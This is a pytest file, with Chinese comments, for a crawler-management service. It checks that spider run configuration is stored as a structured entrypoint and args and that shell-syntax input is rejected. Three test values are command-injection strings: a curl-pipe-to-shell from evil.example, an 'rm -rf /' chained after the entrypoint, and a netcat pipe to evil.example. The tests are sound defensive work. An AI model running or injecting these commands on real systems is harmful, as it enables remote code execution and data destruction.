"""
爬虫运行配置端到端（服务层）测试。

覆盖创建、更新、手动运行与定时调度的真实代码路径，重点验证：
* 结构化字段写入数据库，旧 ``command`` 列不再被写入；
* 队列消息中只包含 entrypoint / args，不含整条命令字符串；
* 包含 Shell 语法的旧输入被拒绝（HTTP 400），不会落库、不会进入队列。
"""

import json
import os
import sys
import uuid

import pytest
from fastapi import HTTPException

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.api.spiders import services as spider_services
from app.api.spiders.models import Spider
from app.api.spiders.schemas import SpiderCreate, SpiderRunRequest, SpiderUpdate
from app.api.tasks.models import SpiderTask
from app.api.users.models import User
from app.core.redis import redis_manager
from app.worker import cron_jobs


class FakeResult:
    def __init__(self, value):
        self._value = value

    def scalars(self):
        return self

    def first(self):
        return self._value


class FakeSession:
    """最小可用的 AsyncSession 替身：只实现服务层实际调用的方法。"""

    def __init__(self, spider: Spider | None = None):
        self.spider = spider
        self.added: list = []
        self.commits = 0

    async def get(self, _model, _pk):
        return self.spider

    async def execute(self, *_args, **_kwargs):
        return FakeResult(self.spider)

    def add(self, obj):
        self.added.append(obj)

    async def flush(self):
        return None

    async def commit(self):
        self.commits += 1

    async def refresh(self, _obj):
        return None


class FakeRedis:
    def __init__(self):
        self.lists: dict[str, list[str]] = {}
        self.kv: dict[str, str] = {}

    async def lpush(self, key, *values):
        self.lists.setdefault(key, []).extend(values)

    async def rpush(self, key, *values):
        self.lists.setdefault(key, []).extend(values)

    async def set(self, key, value, ex=None):
        self.kv[key] = value


class FakeSessionContext:
    def __init__(self, session):
        self._session = session

    async def __aenter__(self):
        return self._session

    async def __aexit__(self, *_exc):
        return False


def make_operator() -> User:
    return User(
        id=uuid.uuid4(),
        email="ops@example.com",
        hashed_password="x",
        is_superuser=True,
    )


def make_spider(**overrides) -> Spider:
    defaults = dict(
        id=1,
        project_id="p1",
        name="demo",
        source_type="MINIO",
        source_url="spiders/x.zip",
        language="python:3.11-slim",
        entrypoint=None,
        args=None,
    )
    defaults.update(overrides)
    return Spider(**defaults)


def collect_queue_messages(redis: FakeRedis) -> str:
    return "\n".join(
        message for messages in redis.lists.values() for message in messages
    )


# ── 创建 ────────────────────────────────────────────────────────────


@pytest.mark.anyio
async def test_create_spider_persists_structured_run_config():
    session = FakeSession()
    created = await spider_services.create_spider(
        SpiderCreate(
            name="demo",
            project_id="p1",
            source_type="MINIO",
            source_url="spiders/x.zip",
            language="python:3.11-slim",
            entrypoint="main.py",
            args=["--mode", "all"],
        ),
        make_operator(),
        session,
    )

    assert created.entrypoint == "main.py"
    assert json.loads(created.args) == ["--mode", "all"]


@pytest.mark.anyio
async def test_create_spider_rejects_unsafe_run_config_with_400():
    session = FakeSession()
    with pytest.raises(HTTPException) as excinfo:
        await spider_services.create_spider(
            SpiderCreate(
                name="demo",
                project_id="p1",
                source_type="MINIO",
                source_url="spiders/x.zip",
                entrypoint="main.py; curl http://evil.example | sh",
            ),
            make_operator(),
            session,
        )

    assert excinfo.value.status_code == 400
    assert session.added == []
    assert session.commits == 0


# ── 更新 ────────────────────────────────────────────────────────────


@pytest.mark.anyio
async def test_update_spider_without_run_config_fields_keeps_existing_value():
    spider = make_spider(entrypoint="main.py", args='["--mode", "all"]')
    session = FakeSession(spider)

    updated = await spider_services.update_spider(
        1, SpiderUpdate(name="renamed"), make_operator(), session
    )

    assert updated.name == "renamed"
    assert updated.entrypoint == "main.py"
    assert updated.args == '["--mode", "all"]'


@pytest.mark.anyio
async def test_update_spider_writes_structured_config():
    spider = make_spider()
    session = FakeSession(spider)

    updated = await spider_services.update_spider(
        1,
        SpiderUpdate(entrypoint="main.py", args=["--mode", "all"]),
        make_operator(),
        session,
    )

    assert updated.entrypoint == "main.py"
    assert json.loads(updated.args) == ["--mode", "all"]


@pytest.mark.anyio
async def test_update_spider_merges_partial_structured_payload():
    spider = make_spider(entrypoint="main.py", args='["--mode", "all"]')
    session = FakeSession(spider)

    updated = await spider_services.update_spider(
        1, SpiderUpdate(args=["--mode", "quick"]), make_operator(), session
    )

    assert updated.entrypoint == "main.py"
    assert json.loads(updated.args) == ["--mode", "quick"]


@pytest.mark.anyio
async def test_update_spider_rejects_unsafe_run_config():
    spider = make_spider(entrypoint="legacy.py")
    session = FakeSession(spider)

    with pytest.raises(HTTPException) as excinfo:
        await spider_services.update_spider(
            1,
            SpiderUpdate(entrypoint="main.py && rm -rf /"),
            make_operator(),
            session,
        )

    assert excinfo.value.status_code == 400
    assert spider.entrypoint == "legacy.py"


# ── 手动运行 ────────────────────────────────────────────────────────


@pytest.mark.anyio
async def test_run_spider_dispatches_structured_run_config_only():
    spider = make_spider(entrypoint="main.py", args='["--mode", "all"]')
    session = FakeSession(spider)
    redis = FakeRedis()

    task_id = await spider_services.run_spider(
        1, SpiderRunRequest(timeout_seconds=600), make_operator(), session, redis
    )

    payload_raw = collect_queue_messages(redis)
    payload = json.loads(payload_raw)
    assert payload["task_id"] == task_id
    assert payload["entrypoint"] == "main.py"
    assert payload["args"] == ["--mode", "all"]
    assert "script_path" not in payload
    assert "python main.py --mode all" not in payload_raw

    task_record = next(obj for obj in session.added if isinstance(obj, SpiderTask))
    assert task_record.entrypoint == "main.py"
    assert json.loads(task_record.args) == ["--mode", "all"]


@pytest.mark.anyio
async def test_run_spider_rejects_spider_without_run_config():
    session = FakeSession(make_spider())
    with pytest.raises(HTTPException) as excinfo:
        await spider_services.run_spider(
            1, SpiderRunRequest(), make_operator(), session, FakeRedis()
        )
    assert excinfo.value.status_code == 400


@pytest.mark.anyio
async def test_run_spider_rejects_invalid_stored_config():
    session = FakeSession(make_spider(entrypoint="main.py | nc evil.example 4444"))
    with pytest.raises(HTTPException) as excinfo:
        await spider_services.run_spider(
            1, SpiderRunRequest(), make_operator(), session, FakeRedis()
        )
    assert excinfo.value.status_code == 400


# ── 定时调度 ────────────────────────────────────────────────────────


@pytest.mark.anyio
async def test_cron_dispatch_sends_structured_run_config(monkeypatch):
    spider = make_spider(entrypoint="main.py", args='["--mode", "all"]')
    session = FakeSession(spider)
    redis = FakeRedis()

    monkeypatch.setattr(cron_jobs, "async_session_maker", lambda: FakeSessionContext(session))
    monkeypatch.setattr(redis_manager, "client", redis, raising=False)
    monkeypatch.setattr(cron_jobs.settings, "PUBLIC_QUEUE_KEY", "task_queue:public")

    await cron_jobs.dispatch_scheduled_task(1, timeout_seconds=900)

    payload_raw = collect_queue_messages(redis)
    payload = json.loads(payload_raw)
    assert payload["entrypoint"] == "main.py"
    assert payload["args"] == ["--mode", "all"]
    assert payload["timeout_seconds"] == 900
    assert "script_path" not in payload
    assert "python main.py --mode all" not in payload_raw

    task_record = next(obj for obj in session.added if isinstance(obj, SpiderTask))
    assert task_record.entrypoint == "main.py"
    assert json.loads(task_record.args) == ["--mode", "all"]


@pytest.mark.anyio
async def test_cron_dispatch_skips_spider_without_run_config(monkeypatch):
    spider = make_spider()
    session = FakeSession(spider)
    redis = FakeRedis()

    monkeypatch.setattr(cron_jobs, "async_session_maker", lambda: FakeSessionContext(session))
    monkeypatch.setattr(redis_manager, "client", redis, raising=False)
    monkeypatch.setattr(cron_jobs.settings, "PUBLIC_QUEUE_KEY", "task_queue:public")

    await cron_jobs.dispatch_scheduled_task(1)

    assert redis.lists == {}
    assert [obj for obj in session.added if isinstance(obj, SpiderTask)] == []
